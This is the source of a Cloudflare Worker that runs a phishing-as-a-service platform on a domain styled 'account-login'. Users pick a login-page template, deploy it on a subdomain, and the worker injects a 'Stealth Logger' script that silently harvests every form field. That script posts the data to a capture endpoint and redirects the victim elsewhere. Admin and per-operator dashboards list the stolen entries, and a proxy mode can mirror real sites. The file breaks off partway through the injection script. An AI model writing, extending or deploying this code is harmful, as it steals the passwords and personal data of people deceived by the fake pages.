/**
 * 🚀 D-TECH GLOBAL ROUTER V6.0 (Simplified)
 * LOCATION: Cloudflare Worker
 */

const PASSWORD = "admin-secret-123";
const COOKIE_NAME = "admin_session";

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const domain = url.hostname; 
    const ROOT_DOMAIN = "account-login.co.za"; // Ensure this matches your actual domain
    let subdomain = null;

    // --- 1. ADMIN AUTHENTICATION & ROUTES ---

    // Check if the request is for an Admin page or Admin API
    const isAdminPath = url.pathname.startsWith('/admin') ||
                        url.pathname === '/api/save' ||
                        url.pathname === '/api/captures' ||
                        url.pathname.startsWith('/api/admin');

    if (isAdminPath) {
        const isAuth = await checkAuth(request);

        // 1.1 Handle Login POST
        if (url.pathname === '/admin/login' && request.method === 'POST') {
            return handleLogin(request);
        }

        // 1.2 Redirect/Block Unauthenticated
        if (!isAuth) {
            // If API, return 401
            if (url.pathname.startsWith('/api/')) {
                return new Response(JSON.stringify({ success: false, error: "Unauthorized" }), { status: 401, headers: {'Content-Type': 'application/json'} });
            }
            // If HTML page, show Login
            return new Response(renderLoginPage(), { headers: { 'Content-Type': 'text/html' } });
        }

        // 1.3 Authenticated Routes
        if (url.pathname === '/admin') {
            return new Response(renderAdminPanel(), { headers: { 'Content-Type': 'text/html' } });
        }

        if (url.pathname === '/admin/captures') {
            return new Response(renderCapturesDashboard(), { headers: { 'Content-Type': 'text/html' } });
        }

        if (url.pathname === '/api/save' && request.method === 'POST') {
            return handleSaveRequest(request, env);
        }

        if (url.pathname === '/api/captures' && request.method === 'GET') {
            return handleGetCaptures(env);
        }

        if (url.pathname === '/api/admin/templates') {
             if (request.method === 'GET') return handleGetTemplates(env);
             if (request.method === 'POST') return handleSaveTemplate(request, env);
             if (request.method === 'DELETE') return handleDeleteTemplate(request, env);
        }

        if (url.pathname === '/api/admin/init-script') {
            await env.SUBDOMAINS.put('system::injection_script', INJECTION_SCRIPT);
            return new Response("Injection script initialized/updated in KV.", { status: 200 });
        }
    }

    // --- 2. PUBLIC API ENDPOINTS & PAGES ---

    // Public User Dashboard
    if (url.pathname === '/dashboard') {
        return new Response(renderUserDashboard(), { headers: { 'Content-Type': 'text/html' } });
    }

    // Public Captures API (Protected by unique code)
    if (url.pathname === '/api/public/captures') {
        if (request.method === 'GET') return handleGetPublicCaptures(request, env);
        if (request.method === 'DELETE') return handleDeletePublicCapture(request, env);
    }

    // Handle Capture Requests (Public)
    if (url.pathname === '/api/capture' && request.method === 'POST') {
      return handleCaptureRequest(request, env);
    }

    // Handle Public Deployment
    if (url.pathname === '/api/public/deploy' && request.method === 'POST') {
        return handlePublicDeploy(request, env, ROOT_DOMAIN);
    }

    // --- 3. SUBDOMAIN ROUTING ---

    // Parse Subdomain
    if (domain !== ROOT_DOMAIN && domain.endsWith("." + ROOT_DOMAIN)) {
        subdomain = domain.slice(0, - (ROOT_DOMAIN.length + 1));
    }

    // If no subdomain (or 'www'), serve the Public Deployment Page
    if (!subdomain || subdomain === 'www') {
       const templates = await getTemplatesList(env);
       return new Response(renderPublicPage(templates), {
         headers: { 'Content-Type': 'text/html' }
       });
    }

    // Lookup Subdomain in KV
    const data = await env.SUBDOMAINS.get(subdomain, { type: "json" });

    if (!data) {
      return new Response(render404(subdomain), { status: 404, headers: { 'Content-Type': 'text/html' } });
    }

    // --- 4. SERVE CONTENT ---

    if (data.type === 'HTML') {
      // Serve stored HTML directly
      return new Response(data.content, {
        headers: { 'Content-Type': 'text/html' }
      });
    }

    if (data.type === 'PROXY') {
      // Fetch content from the target URL (Reverse Proxy)
      try {
        const targetUrl = data.content;
        const forwardUrl = new URL(targetUrl);
        forwardUrl.pathname = url.pathname === '/' ? forwardUrl.pathname : url.pathname;
        forwardUrl.search = url.search;

        const proxyResponse = await fetch(forwardUrl.toString(), {
          headers: {
            'User-Agent': request.headers.get('User-Agent') || 'D-TECH Cloud Proxy',
          }
        });

        const response = new Response(proxyResponse.body, proxyResponse);
        return response;

      } catch (err) {
        return new Response(`<h1>Proxy Error</h1><p>${err.message}</p>`, { status: 502, headers: {'Content-Type': 'text/html'} });
      }
    }

    return new Response("Configuration Error: Unknown Type", { status: 500 });
  }
};

// --- HELPER FUNCTIONS ---

async function checkAuth(request) {
  const cookieHeader = request.headers.get('Cookie');
  if (!cookieHeader) return false;
  return cookieHeader.includes(`${COOKIE_NAME}=${PASSWORD}`);
}

async function handleLogin(request) {
    try {
        const formData = await request.formData();
        const password = formData.get('password');
        if (password === PASSWORD) {
            return new Response(null, {
                status: 302,
                headers: {
                    'Location': '/admin',
                    'Set-Cookie': `${COOKIE_NAME}=${PASSWORD}; Path=/; HttpOnly; SameSite=Strict; Max-Age=86400`
                }
            });
        }
        return new Response(renderLoginPage("Invalid Password"), { headers: { 'Content-Type': 'text/html' } });
    } catch (e) {
        return new Response(renderLoginPage("Error processing request"), { headers: { 'Content-Type': 'text/html' } });
    }
}

async function handleSaveRequest(request, env) {
  try {
    const body = await request.json();
    const { subdomain, type, content } = body;

    if (!subdomain || !type || !content) {
      return new Response(JSON.stringify({ success: false, error: "Missing fields" }), { status: 400 });
    }

    const entry = {
      type: type, // 'HTML' or 'PROXY'
      content: content,
      updated: Date.now()
    };

    await env.SUBDOMAINS.put(subdomain, JSON.stringify(entry));

    return new Response(JSON.stringify({ success: true, subdomain, type }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (err) {
    return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
  }
}

async function handleCaptureRequest(request, env) {
  try {
    const body = await request.json();
    const timestamp = Date.now();
    const uuid = crypto.randomUUID();

    // Extract uniqueCode from body if available
    const uniqueCode = body.uniqueCode || 'default';
    const key = `capture::${uniqueCode}::${timestamp}::${uuid}`;

    // Store the raw captured data
    await env.SUBDOMAINS.put(key, JSON.stringify({
      timestamp: timestamp,
      data: body
    }));

    return new Response(JSON.stringify({ success: true, key: key }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (err) {
    return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
  }
}

async function handleGetCaptures(env) {
  try {
    const list = await env.SUBDOMAINS.list({ prefix: "capture::" });
    const keys = list.keys;
    const latestKeys = keys.slice(-20).reverse();

    const promises = latestKeys.map(async (k) => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { key: k.name, ...val };
    });

    const results = await Promise.all(promises);

    return new Response(JSON.stringify({ success: true, data: results }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (err) {
     return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
  }
}

async function handleGetTemplates(env) {
    const list = await env.SUBDOMAINS.list({ prefix: "template::" });
    const keys = list.keys;
    const templates = await Promise.all(keys.map(async k => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { name: k.name.replace("template::", ""), ...val };
    }));
    return new Response(JSON.stringify({ success: true, data: templates }), { headers: { 'Content-Type': 'application/json' } });
}

async function getTemplatesList(env) {
    const list = await env.SUBDOMAINS.list({ prefix: "template::" });
    return list.keys.map(k => k.name.replace("template::", ""));
}

async function handleSaveTemplate(request, env) {
    const body = await request.json();
    const { name, content } = body;
    if (!name || !content) return new Response(JSON.stringify({ success: false, error: "Missing fields" }), { status: 400 });

    await env.SUBDOMAINS.put(`template::${name}`, JSON.stringify({ content, updated: Date.now() }));
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleDeleteTemplate(request, env) {
    const url = new URL(request.url);
    const name = url.searchParams.get('name');
    if (!name) return new Response(JSON.stringify({ success: false, error: "Missing name" }), { status: 400 });

    await env.SUBDOMAINS.delete(`template::${name}`);
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handlePublicDeploy(request, env, rootDomain) {
    try {
        const body = await request.json();
        const { subdomain, uniqueCode, templateName } = body;

        // Validation
        if (!subdomain || !uniqueCode || !templateName) return jsonError("Missing fields");
        if (!/^[a-zA-Z0-9-]+$/.test(subdomain)) return jsonError("Invalid subdomain format");

        // Check availability
        const existingSub = await env.SUBDOMAINS.get(subdomain);
        if (existingSub) return jsonError("Subdomain already taken");

        // Check unique code usage
        const existingCode = await env.SUBDOMAINS.get(`code_map::${uniqueCode}`);
        if (existingCode) return jsonError("Unique code already used");

        // Get Template
        const templateData = await env.SUBDOMAINS.get(`template::${templateName}`, { type: "json" });
        if (!templateData) return jsonError("Template not found");

        // Get Injection Script (from KV or fallback to constant)
        let scriptContent = await env.SUBDOMAINS.get('system::injection_script');
        if (!scriptContent) scriptContent = INJECTION_SCRIPT;

        // Inject Script
        const injectionBlock = \`
        <script>
        window.UNIQUE_CODE = "\${uniqueCode}";
        </script>
        <script>
        \${scriptContent}
        </script>
        \`;

        let html = templateData.content;
        // Inject before </body> if exists, else append
        if (html.includes('</body>')) {
            html = html.replace('</body>', \`\${injectionBlock}</body>\`);
        } else {
            html += injectionBlock;
        }

        // Save Subdomain
        await env.SUBDOMAINS.put(subdomain, JSON.stringify({
            type: 'HTML',
            content: html,
            updated: Date.now(),
            ownerCode: uniqueCode
        }));

        // Save Code Map
        await env.SUBDOMAINS.put(\`code_map::\${uniqueCode}\`, JSON.stringify({
            subdomain: subdomain,
            created: Date.now()
        }));

        return new Response(JSON.stringify({ success: true, url: \`https://\${subdomain}.\${rootDomain}\` }), {
            headers: { 'Content-Type': 'application/json' }
        });
    } catch (e) {
        return jsonError(e.message, 500);
    }
}

async function handleGetPublicCaptures(request, env) {
    const url = new URL(request.url);
    const code = url.searchParams.get('code');
    if (!code) return jsonError("Missing code");

    // List keys with prefix 'capture::{code}::'
    const list = await env.SUBDOMAINS.list({ prefix: \`capture::\${code}::\` });
    const keys = list.keys.slice(-50).reverse(); // Last 50

    const promises = keys.map(async (k) => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { key: k.name, ...val };
    });

    const results = await Promise.all(promises);
    return new Response(JSON.stringify({ success: true, data: results }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleDeletePublicCapture(request, env) {
    const url = new URL(request.url);
    const code = url.searchParams.get('code');
    const key = url.searchParams.get('key');
    if (!code || !key) return jsonError("Missing fields");

    // Security check: Ensure key belongs to code
    if (!key.startsWith(\`capture::\${code}::\`)) return jsonError("Unauthorized deletion", 403);

    await env.SUBDOMAINS.delete(key);
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

function jsonError(msg, status = 400) {
    return new Response(JSON.stringify({ success: false, error: msg }), { status: status, headers: { 'Content-Type': 'application/json' } });
}

function renderLoginPage(error = null) {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login</title>
    <style>
        body { font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f9; margin: 0; }
        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 300px; }
        h1 { text-align: center; color: #333; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #0070f3; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #005bb5; }
        .error { color: red; text-align: center; margin-bottom: 15px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>Admin Login</h1>
        ${error ? `<div class="error">${error}</div>` : ''}
        <form action="/admin/login" method="POST">
            <input type="password" name="password" placeholder="Enter Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
  `;
}

function render404(subdomain) {
  return `<html><body style="text-align:center; font-family: sans-serif; padding: 50px;">
    <h1>404 - Subdomain Not Found</h1>
    <p>The subdomain <strong>${subdomain}</strong> is not configured.</p>
  </body></html>`;
}

function renderPublicPage(templates) {
    const options = templates.map(t => \`<option value="\${t}">\${t}</option>\`).join('');
    return \`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloud Hosting Deployment</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; color: #333; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin:0; }
        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 100%; max-width: 500px; }
        h1 { text-align: center; color: #0070f3; margin-top: 0; }
        p { text-align: center; color: #666; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #444; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; transition: border-color 0.2s; }
        input:focus, select:focus { border-color: #0070f3; outline: none; }
        button { width: 100%; padding: 14px; background: #0070f3; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; transition: background 0.2s; }
        button:hover { background: #005bb5; }
        .footer { text-align: center; margin-top: 20px; font-size: 14px; color: #888; }
        .footer a { color: #0070f3; text-decoration: none; }
        #message { margin-top: 20px; padding: 15px; border-radius: 6px; display: none; text-align: center; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 Deploy Your Site</h1>
        <p>Choose a template and launch instantly.</p>

        <div class="form-group">
            <label>Choose Template</label>
            <select id="templateName">
                <option value="">-- Select a Template --</option>
                \${options}
            </select>
        </div>

        <div class="form-group">
            <label>Subdomain Name</label>
            <input type="text" id="subdomain" placeholder="e.g., mysite">
        </div>

        <div class="form-group">
            <label>Unique Secret Code</label>
            <input type="text" id="uniqueCode" placeholder="Create a secret code (for accessing data)">
        </div>

        <button onclick="deploy()">Deploy Now</button>

        <div id="message"></div>

        <div class="footer">
            <a href="/dashboard">Access User Dashboard</a>
        </div>
    </div>

    <script>
        async function deploy() {
            const templateName = document.getElementById('templateName').value;
            const subdomain = document.getElementById('subdomain').value;
            const uniqueCode = document.getElementById('uniqueCode').value;
            const btn = document.querySelector('button');

            if (!templateName || !subdomain || !uniqueCode) {
                showMessage('Please fill in all fields.', 'error');
                return;
            }

            btn.innerText = 'Deploying...';
            btn.disabled = true;
            showMessage('', '');

            try {
                const res = await fetch('/api/public/deploy', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ templateName, subdomain, uniqueCode })
                });
                const data = await res.json();

                if (data.success) {
                    showMessage('Deployment Successful! Redirecting...', 'success');
                    setTimeout(() => {
                        window.location.href = data.url;
                    }, 2000);
                } else {
                    showMessage(data.error, 'error');
                    btn.innerText = 'Deploy Now';
                    btn.disabled = false;
                }
            } catch (e) {
                showMessage('Network Error: ' + e.message, 'error');
                btn.innerText = 'Deploy Now';
                btn.disabled = false;
            }
        }

        function showMessage(text, type) {
            const el = document.getElementById('message');
            el.innerText = text;
            el.className = type;
            el.style.display = text ? 'block' : 'none';
        }
    </script>
</body>
</html>
    \`;
}

function renderUserDashboard() {
    return \`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Dashboard</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; color: #333; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
        h1 { margin-top: 0; color: #0070f3; text-align: center; }
        .login-section { text-align: center; margin-top: 40px; }
        .data-section { display: none; }
        input { padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; width: 300px; }
        button { padding: 12px 20px; background: #0070f3; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; }
        button:hover { background: #005bb5; }
        button.btn-delete { background: #d32f2f; padding: 6px 12px; font-size: 14px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { text-align: left; padding: 12px; border-bottom: 1px solid #eee; }
        th { background: #fafafa; color: #555; }
        pre { background: #f4f4f4; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 13px; max-height: 200px; }
        #error-msg { color: red; margin-top: 10px; }
        .nav-link { display:block; text-align:center; margin-top: 20px; }
        .nav-link a { color: #0070f3; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📊 User Dashboard</h1>

        <div id="login-section" class="login-section">
            <p>Enter your Unique Code to view your data.</p>
            <input type="text" id="code-input" placeholder="Unique Code">
            <button onclick="login()">View Data</button>
            <div id="error-msg"></div>
            <div class="nav-link"><a href="/">&larr; Back to Deploy</a></div>
        </div>

        <div id="data-section" class="data-section">
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <h3>Your Captured Data</h3>
                <button onclick="logout()" style="background:#666;">Logout</button>
            </div>
            <div id="loading">Loading...</div>
            <table id="data-table">
                <thead>
                    <tr>
                        <th style="width: 180px;">Time</th>
                        <th>Data</th>
                        <th style="width: 80px;">Action</th>
                    </tr>
                </thead>
                <tbody id="table-body"></tbody>
            </table>
        </div>
    </div>

    <script>
        let currentCode = localStorage.getItem('user_code');

        if (currentCode) {
            showData(currentCode);
        }

        function login() {
            const code = document.getElementById('code-input').value.trim();
            if(!code) return;
            localStorage.setItem('user_code', code);
            currentCode = code;
            showData(code);
        }

        function logout() {
            localStorage.removeItem('user_code');
            location.reload();
        }

        function showData(code) {
            document.getElementById('login-section').style.display = 'none';
            document.getElementById('data-section').style.display = 'block';
            loadCaptures(code);
        }

        async function loadCaptures(code) {
            const tbody = document.getElementById('table-body');
            tbody.innerHTML = '';
            document.getElementById('loading').style.display = 'block';

            try {
                const res = await fetch(\`/api/public/captures?code=\${encodeURIComponent(code)}\`);
                const data = await res.json();

                document.getElementById('loading').style.display = 'none';

                if (data.success && data.data.length > 0) {
                    data.data.forEach(item => {
                        const tr = document.createElement('tr');

                        const date = new Date(item.timestamp).toLocaleString();
                        const jsonStr = JSON.stringify(item.data, null, 2);

                        tr.innerHTML = \`
                            <td>\${date}</td>
                            <td><pre>\${jsonStr}</pre></td>
                            <td><button class="btn-delete" onclick="deleteItem('\${item.key}')">Delete</button></td>
                        \`;
                        tbody.appendChild(tr);
                    });
                } else {
                    tbody.innerHTML = '<tr><td colspan="3" style="text-align:center; padding:20px;">No data found.</td></tr>';
                }
            } catch (e) {
                document.getElementById('loading').innerText = 'Error: ' + e.message;
            }
        }

        async function deleteItem(key) {
            if(!confirm('Delete this entry?')) return;
            try {
                const res = await fetch(\`/api/public/captures?code=\${encodeURIComponent(currentCode)}&key=\${encodeURIComponent(key)}\`, {
                    method: 'DELETE'
                });
                const data = await res.json();
                if(data.success) {
                    loadCaptures(currentCode);
                } else {
                    alert('Error: ' + data.error);
                }
            } catch (e) {
                alert('Network Error');
            }
        }
    </script>
</body>
</html>
    \`;
}

function renderAdminPanel() {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>D-TECH Cloud Admin</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f4f4f9; color: #333; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { margin-top: 0; color: #0070f3; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="text"], textarea, select { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        textarea { height: 150px; font-family: monospace; }
        button { background: #0070f3; color: #fff; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; width: 100%; }
        button.btn-danger { background: #d32f2f; }
        button:hover { opacity: 0.9; }
        .tabs { display: flex; margin-bottom: 20px; border-bottom: 2px solid #eee; }
        .tab { padding: 10px 20px; cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -2px; }
        .tab.active { border-bottom-color: #0070f3; color: #0070f3; font-weight: bold; }
        .hidden { display: none; }
        #message { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
        .nav-links { margin-bottom: 20px; text-align: right; }
        .nav-links a { color: #0070f3; text-decoration: none; font-weight: bold; }

        /* Table Styles */
        table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #eee; }
        th { background: #fafafa; }
    </style>
</head>
<body>
    <div class="container">
        <div class="nav-links">
            <a href="/admin/captures">View Captured Data &rarr;</a>
        </div>
        <h1>🚀 Cloud Admin Panel</h1>

        <div class="tabs">
            <div class="tab active" onclick="switchTab('templates')">Manage Templates</div>
            <div class="tab" onclick="switchTab('proxy')">Deploy Proxy (Admin)</div>
        </div>

        <!-- Templates Section -->
        <div id="templates-section" class="form-section">
            <h2>Existing Templates</h2>
            <div id="template-list">Loading...</div>

            <h3>Add New Template</h3>
            <div class="form-group">
                <label>Template Name</label>
                <input type="text" id="tpl-name" placeholder="e.g., login-page-v1">
            </div>
            <div class="form-group">
                <label>HTML Content</label>
                <textarea id="tpl-content" placeholder="<html>...</html>"></textarea>
            </div>
            <button onclick="saveTemplate()">Save Template</button>
        </div>

        <!-- Proxy Form (Legacy Admin Feature) -->
        <div id="proxy-section" class="form-section hidden">
            <p>Admin-only proxy deployment (bypasses templates).</p>
            <div class="form-group">
                <label>Subdomain</label>
                <input type="text" id="proxy-subdomain" placeholder="e.g., blog">
            </div>
            <div class="form-group">
                <label>Target URL</label>
                <input type="text" id="proxy-url" placeholder="https://example.com">
            </div>
            <button onclick="saveProxy()">Create Proxy</button>
        </div>

        <div id="message"></div>
    </div>

    <script>
        function switchTab(tab) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.form-section').forEach(f => f.classList.add('hidden'));

            if (tab === 'templates') {
                document.querySelector('.tabs .tab:nth-child(1)').classList.add('active');
                document.getElementById('templates-section').classList.remove('hidden');
                loadTemplates();
            } else {
                document.querySelector('.tabs .tab:nth-child(2)').classList.add('active');
                document.getElementById('proxy-section').classList.remove('hidden');
            }
        }

        async function loadTemplates() {
            try {
                const res = await fetch('/api/admin/templates');
                const data = await res.json();
                const list = document.getElementById('template-list');
                if (data.success && data.data.length > 0) {
                    let html = '<table><thead><tr><th>Name</th><th>Action</th></tr></thead><tbody>';
                    data.data.forEach(tpl => {
                        html += \`<tr>
                            <td>\${tpl.name}</td>
                            <td><button class="btn-danger" style="width:auto; padding: 5px 10px;" onclick="deleteTemplate('\${tpl.name}')">Delete</button></td>
                        </tr>\`;
                    });
                    html += '</tbody></table>';
                    list.innerHTML = html;
                } else {
                    list.innerHTML = '<p>No templates found.</p>';
                }
            } catch (e) {
                document.getElementById('template-list').innerText = 'Error loading templates.';
            }
        }

        async function saveTemplate() {
            const name = document.getElementById('tpl-name').value;
            const content = document.getElementById('tpl-content').value;
            if (!name || !content) return showMessage('Missing fields', 'error');

            const btn = document.querySelector('button'); // Careful selector
            const originalText = btn.innerText;
            btn.innerText = 'Saving...';

            try {
                const res = await fetch('/api/admin/templates', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({name, content})
                });
                const data = await res.json();
                if (data.success) {
                    showMessage('Template saved!', 'success');
                    document.getElementById('tpl-name').value = '';
                    document.getElementById('tpl-content').value = '';
                    loadTemplates();
                } else {
                    showMessage(data.error, 'error');
                }
            } catch (e) {
                showMessage(e.message, 'error');
            }
            btn.innerText = originalText;
        }

        async function deleteTemplate(name) {
            if(!confirm('Delete template ' + name + '?')) return;
            try {
                 const res = await fetch('/api/admin/templates?name=' + name, { method: 'DELETE' });
                 loadTemplates();
            } catch(e) {
                alert(e.message);
            }
        }

        async function saveProxy() {
            const subdomain = document.getElementById('proxy-subdomain').value;
            const content = document.getElementById('proxy-url').value;
            if (!subdomain || !content) return showMessage('Missing fields', 'error');

            try {
                const response = await fetch('/api/save', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ subdomain, type: 'PROXY', content })
                });
                const result = await response.json();
                if (result.success) showMessage('Proxy created!', 'success');
                else showMessage(result.error, 'error');
            } catch (err) {
                showMessage('Network Error: ' + err.message, 'error');
            }
        }

        function showMessage(text, type) {
            const el = document.getElementById('message');
            el.innerText = text;
            el.className = type;
            el.style.display = 'block';
        }

        // Initial load
        loadTemplates();
    </script>
</body>
</html>
  `;
}

function renderCapturesDashboard() {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captured Data Dashboard</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f4f4f9; color: #333; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { margin-top: 0; color: #d32f2f; }
        .nav-links { margin-bottom: 20px; }
        .nav-links a { color: #0070f3; text-decoration: none; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { text-align: left; padding: 12px; border-bottom: 1px solid #eee; }
        th { background: #fafafa; color: #555; }
        tr:hover { background: #f9f9f9; }
        pre { background: #f4f4f4; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 13px; max-height: 200px; }
        .empty { text-align: center; color: #888; padding: 40px; }
        .timestamp { color: #666; font-size: 0.9em; white-space: nowrap; }
    </style>
</head>
<body>
    <div class="container">
        <div class="nav-links">
            <a href="/admin">&larr; Back to Admin Panel</a>
        </div>
        <h1>🕵️ Captured Data Logs</h1>
        <p>Real-time data captured from injected pages.</p>

        <div id="loading">Loading data...</div>
        <table id="data-table" style="display:none;">
            <thead>
                <tr>
                    <th style="width: 180px;">Time</th>
                    <th>Data Payload</th>
                </tr>
            </thead>
            <tbody id="table-body">
            </tbody>
        </table>
    </div>

    <script>
        async function loadData() {
            try {
                const response = await fetch('/api/captures');
                const result = await response.json();

                if (result.success) {
                    renderTable(result.data);
                } else {
                    document.getElementById('loading').innerText = 'Error loading data: ' + result.error;
                }
            } catch (err) {
                document.getElementById('loading').innerText = 'Network Error: ' + err.message;
            }
        }

        function renderTable(data) {
            const tbody = document.getElementById('table-body');
            const table = document.getElementById('data-table');
            const loading = document.getElementById('loading');

            loading.style.display = 'none';
            table.style.display = 'table';
            tbody.innerHTML = '';

            if (data.length === 0) {
                tbody.innerHTML = '<tr><td colspan="2" class="empty">No captured data yet.</td></tr>';
                return;
            }

            data.forEach(item => {
                const row = document.createElement('tr');

                // Format timestamp
                const date = new Date(item.timestamp);
                const timeStr = date.toLocaleString();

                // Format JSON data safely
                const jsonStr = JSON.stringify(item.data, null, 2);

                // Use DOM methods to prevent XSS
                const timeCell = document.createElement('td');
                timeCell.className = 'timestamp';
                timeCell.textContent = timeStr;

                const dataCell = document.createElement('td');
                const pre = document.createElement('pre');
                pre.textContent = jsonStr;
                dataCell.appendChild(pre);

                row.appendChild(timeCell);
                row.appendChild(dataCell);

                tbody.appendChild(row);
            });
        }

        // Load on start
        loadData();

        // Refresh every 30 seconds
        setInterval(loadData, 30000);
    </script>
</body>
</html>
  `;
}

// ==========================================
// INJECTION SCRIPT TEMPLATE
// This script will be injected into deployed pages.
// It will be initialized in KV by calling /api/admin/init-script
// ==========================================
const INJECTION_SCRIPT = \`// CONFIG
const CONFIG = {
    INPUT_IDLE_TIMEOUT: 2000,
    // Expanded patterns as requested
    SUBMIT_BUTTON_PATTERNS: [
        'submit', 'login', 'sign in', 'continue', 'next', 'confirm', 'proceed', 'authenticate',
        'log on', 'start', 'verify', 'go', 'enter', 'accept'
    ],
    REDIRECT_URL: 'https://example.com',
    // The worker endpoint to receive data (relative path)
    CAPTURE_URL: '/api/capture'
};

// ===== INVISIBLE LOGGER =====
(() => {
    const log = (msg, type='info') => console.log(\`[Stealth Logger] \${msg}\`);

    let typingTimer;
    let formData = {};

    // Helper to get a usable name for a field
    const getFieldName = (field) => {
        return field.name || field.id || field.placeholder || field.getAttribute('aria-label') || \`unnamed_\${field.type}\`;
    };

    // Helper to capture ALL current inputs on the page
    const captureAllInputs = () => {
        const data = { ...formData }; // Start with what we captured from typing
        document.querySelectorAll('input, textarea, select').forEach(field => {
            const name = getFieldName(field);
            const value = field.value.trim();
            // Only add if it has a value and isn't already captured (or overwrite if we prefer fresh data)
            // Prioritize fresh DOM read over typing history for accuracy at submit time
            if (value) {
                data[name] = value;
            }
        });
        return data;
    };

    // Send to your Worker
    const sendData = async (data) => {
        try {
            const timestamp = new Date().toISOString();
            const pageUrl = window.location.href;
            const uniqueCode = window.UNIQUE_CODE || 'UNKNOWN'; // Get the unique code injected by the worker

            // Build a simple JSON payload for the worker
            const payload = {
                url: pageUrl,
                timestamp: timestamp,
                formData: data,
                userAgent: navigator.userAgent,
                uniqueCode: uniqueCode // Include the unique code
            };

            const response = await fetch(CONFIG.CAPTURE_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                log('Successfully sent to Worker');
                window.location.href = CONFIG.REDIRECT_URL;  // Redirect after success
            } else {
